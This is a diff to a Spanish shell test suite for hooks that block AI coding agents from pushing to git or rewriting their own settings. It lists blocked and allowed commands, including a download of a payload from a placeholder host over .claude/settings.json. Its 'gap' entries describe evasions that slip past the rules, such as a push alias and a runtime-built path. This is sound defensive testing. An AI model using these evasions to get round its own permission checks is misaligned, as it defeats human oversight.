@@ -185,15 +185,58 @@ caso PASA    'chmod 644 docs/informe.md' \
              'vecino: un permiso concreto sobre un archivo concreto'
 
 # ===========================================================================
-seccion "Sección 2 — historia de git y ramas protegidas"
+seccion "Sección 2 — push e historia de git"
+# Ningún agente hace push, a ninguna rama: lo hace el PM. Hasta la 1.3.0 el caso de
+# la rama propia estaba aquí como PASA, "el flujo normal", y la capa dura dejaba
+# pasar lo que la de permisos ya denegaba.
+caso BLOQUEA 'git push origin tarea-12-devoluciones' \
+             'la rama propia: también, y es el caso que cambió en la 1.4.0'
+caso PASA    'git log origin/main --oneline -10' \
+             'vecino: leer lo que hay en el remoto no es empujar'
 caso BLOQUEA 'git push --force origin tarea-12' \
              'reescritura remota'
-caso PASA    'git push origin tarea-12-devoluciones' \
-             'vecino: empujar la propia rama es el flujo normal'
 caso BLOQUEA 'git push origin main' \
              'la rama protegida'
-caso PASA    'git log origin/main --oneline -10' \
-             'vecino: menciona main, pero solo lee'
+caso BLOQUEA 'git push' \
+             'a secas, a lo que tenga configurado la rama'
+caso BLOQUEA 'git push --dry-run origin tarea-12' \
+             'DECISIÓN DELIBERADA: sin excepción para --dry-run. Si algún día hace
+             falta, se agrega con su caso aquí, no antes'
+caso PASA    'git fetch origin' \
+             'vecino: traer del remoto sí'
+caso BLOQUEA 'git -C ../wms push origin tarea-12' \
+             'opción global entre git y el verbo: Bash(git push*) no la ve'
+caso PASA    'git -C ../wms status' \
+             'vecino: la misma opción global con un verbo inocente'
+caso BLOQUEA 'git -c http.extraHeader=x push origin tarea-12' \
+             'opción global con su valor'
+caso BLOQUEA 'sudo -u fabrica git push origin tarea-12' \
+             'con envoltorio delante: la misma ENVOLTURA'
+caso BLOQUEA 'bash -c "git push origin tarea-12"' \
+             'shell anidado: con --force o main, el case de subcadena de la 1.3.0 lo
+             bloqueaba; la regla anclada no debe perder eso, y ahora cubre toda rama'
+caso PASA    'bash -c "npm test"' \
+             'vecino: el shell anidado con algo inocente'
+caso BLOQUEA "eval 'git push origin tarea-12'" \
+             'eval es otro shell anidado'
+caso BLOQUEA 'git send-pack origin refs/heads/tarea-12' \
+             'la fontanería que hay debajo de push: misma familia'
+caso BLOQUEA 'git subtree push --prefix=dist origin gh-pages' \
+             'subtree push también empuja'
+caso PASA    'git subtree split --prefix=dist' \
+             'vecino: subtree sin push trabaja en local'
+caso PASA    'git stash push -m "a medias"' \
+             'vecino: aquí push es el verbo de stash, no un push remoto'
+caso PASA    'git commit -m "dejar listo para que el PM haga git push"' \
+             'vecino: la cadena en un mensaje de commit es un argumento'
+caso PASA    'git tag ancla/tarea-12' \
+             'vecino: el tag de anclaje es obligatorio antes de tocar lo que funciona'
+caso PASA    'git switch -c agente/tarea-12-reintento ancla/tarea-12' \
+             'vecino: volver al ancla es como se deshace una tarea'
+hueco "git config alias.sube push" \
+      'Un alias: `git sube` empuja y no dice push. La regla mira el texto del
+          comando, no la configuración de git. La capa que lo cierra de verdad es que
+          el nodo no tenga credenciales de escritura contra el remoto.'
 caso BLOQUEA 'git filter-branch --tree-filter ls HEAD' \
              'reescritura de historia'
 caso PASA    'git reset --hard HEAD~1' \
@@ -411,11 +454,17 @@ caso BLOQUEA $'node build.js\ncat .claude/settings.json' \
 hueco 'curl -o .claude/settings.json https://ejemplo.com/cargautil.json' \
       'La familia de "escribir un archivo" no tiene fin: curl -o, wget -O, rsync,
           unzip -d, tar -C, git checkout -- ... No se persigue aquí comando a comando;
-          la contención real es denyWrite del sandbox sobre esas mismas rutas.'
-hueco "bash -c \"cp /tmp/cargautil .claude/settings.json\"" \
-      'Un shell anidado: el comando peligroso va dentro de comillas y el ancla no lo
-          ve en posición de comando. Anclar tras comillas rompería el caso
-          echo "crontab -l" > notas.txt. Mismo destino que el anterior: sandbox.'
+          la contención real es denyWrite del sandbox sobre esas mismas rutas — DONDE
+          el sandbox esté activo. En Windows nativo no lo está: probar-hooks.sh lo dice.'
+caso BLOQUEA "bash -c \"cp /tmp/cargautil .claude/settings.json\"" \
+             'shell anidado: era un HUECO declarado en la 1.3.0, cerrado en la 1.4.0
+             anclando tras el -c de un shell, no tras cualquier comilla'
+caso PASA    "bash -c \"cp .claude/settings.json /tmp/copia.json\"" \
+             'vecino: el mismo shell anidado, leyendo'
+caso BLOQUEA "sh -c 'crontab -l'" \
+             'el mismo cierre alcanza a 3a'
+caso PASA    'ssh -c aes128-ctr servidor-pruebas uptime' \
+             'vecino: ssh -c es un cifrado, no un shell anidado'
 hueco "node -e \"fs.writeFileSync(['.cla','ude'].join('')+'/settings.json', x)\"" \
       'La ruta construida en tiempo de ejecución. Ninguna expresión regular sobre el
           texto del comando puede ver esto: es el límite del método, no de la regla.'
